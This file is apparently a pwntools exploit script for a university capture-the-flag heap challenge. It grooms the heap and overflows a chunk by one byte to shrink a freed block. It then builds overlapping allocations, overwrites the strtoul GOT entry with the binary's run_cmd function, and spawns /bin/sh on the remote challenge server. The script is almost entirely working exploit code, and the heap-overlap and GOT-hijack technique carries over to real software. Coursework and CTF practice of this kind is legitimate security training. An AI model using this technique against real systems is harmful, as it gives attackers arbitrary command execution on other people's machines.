#!/usr/bin/env python3
#import from py
import re

import struct
from pwn import *


#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1346
netid=''

do_remote = True
# do_remote = True
binary_name = './do_the_shrink'

#for doing local debugging
is_local_dbg = False
gdb_script = '''
set pagination off
set disassembly-flavor intel
set follow-fork-mode parent
i proc mappings

b read_boot
command
heap
x/20gx &boots
x/140gx *(&boots)
end

c
'''

context.log_level ='debug'

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input.decode('ascii'))
    if(m != []):
        return m[0]
    else:
        return None

e       = ELF(binary_name)
run_cmd = p64(e.symbols['run_cmd'])


def create_new_boot(target, size, material):
   
    target.sendlineafter('> ', '1')
    target.sendlineafter('boot?', str(size))
    target.sendlineafter('of?', material)


def delete_boot(target, index):
    target.sendlineafter('> ', '2')
    target.sendlineafter('anymore?', str(index))


def read_boot(target, index):
    if(is_local_dbg):
        target.sendlineafter('> ', '3')
        target.sendlineafter('today?', str(index))
        return target.recvuntil('1.')


def edit_boot(target, index, material):
    target.sendlineafter('> ', '4')
    target.sendlineafter('today?', str(index))
    return target.sendlineafter('boot?', material)



#we groom the heap so that our later chunks are properly aligned
def stage_0_groom_the_heap(target):
    create_new_boot(target, 0x20, '11111')
    create_new_boot(target, 0x20, '22222')
    create_new_boot(target, 0x20, '33333')
    delete_boot(target, 0)
    delete_boot(target, 0)
    delete_boot(target, 0)
    #for debugging, lets read the boots here after stage
    print('Stage 0: Heap Groomed')
    read_boot(target, 0)
    return

asize = 0x500+8
def stage_1_create_large_boots(target):
    #for debugging, lets read the boots here after stage
    print('Stage 1: Large Boots Allocated')

    # read_boot(target, 0)
    #a
    
    create_new_boot(target, asize, b'\x41'*asize)
    #b
    # create_new_boot(target, 0xa00, b'\x42')
    bsize = 0xa00
    create_new_boot(target, 0xa00, b'\x42'*bsize)
    edit_boot(target, 1, b'\x00\x0a\x00\x00\x00\x00\x00\x00'*((0xa00)//8))
    input('check 1')
    #c
    create_new_boot(target, 0x500, b'\x43'*0x500)
    #barrier
    create_new_boot(target, 0x100, b'\xFE'*0x100)


def stage_2_create_and_shrink(target):
    input('about to delete 1')

    print('Stage 2: Hole Created')
    delete_boot(target, 1)

    input('about overflow from 0')
    print('Stage 2: Hole Overflowed')
    edit_boot(target, 0, b'\x44'*asize)

    input('about overflowed from 0')


def stage_3_make_smaller_chunks_in_freed_block(target):
    #for debugging, lets read the boots here after stage
    print('Stage 3: Hole Overwritten')
    create_new_boot(target, 0x500, b'\x45'*0x500)
    create_new_boot(target, 0x480, b'\x46'*0x480)


def stage_4_free_blocks(target):
    #for debugging, lets read the boots here after stage
    print('Stage 4: Last Boots Deleted')
    delete_boot(target, 3)
    delete_boot(target, 2)


def stage_5_create_overlapping_object(target):
    create_new_boot(target, 0xc00, b'\x48'*0xa)
    

def stage_6_run_binsh(target):

    addr_strtoul    = p64(e.got['strtoul'])
    addr_runcmd     = p64(e.symbols['run_cmd'])

 
    edit_boot(target, 3, 0x510*b'\x46' + addr_strtoul)
    edit_boot(target, 2, addr_runcmd)

    target.sendlineafter('> ', '/bin/sh\x00')
    target.interactive()
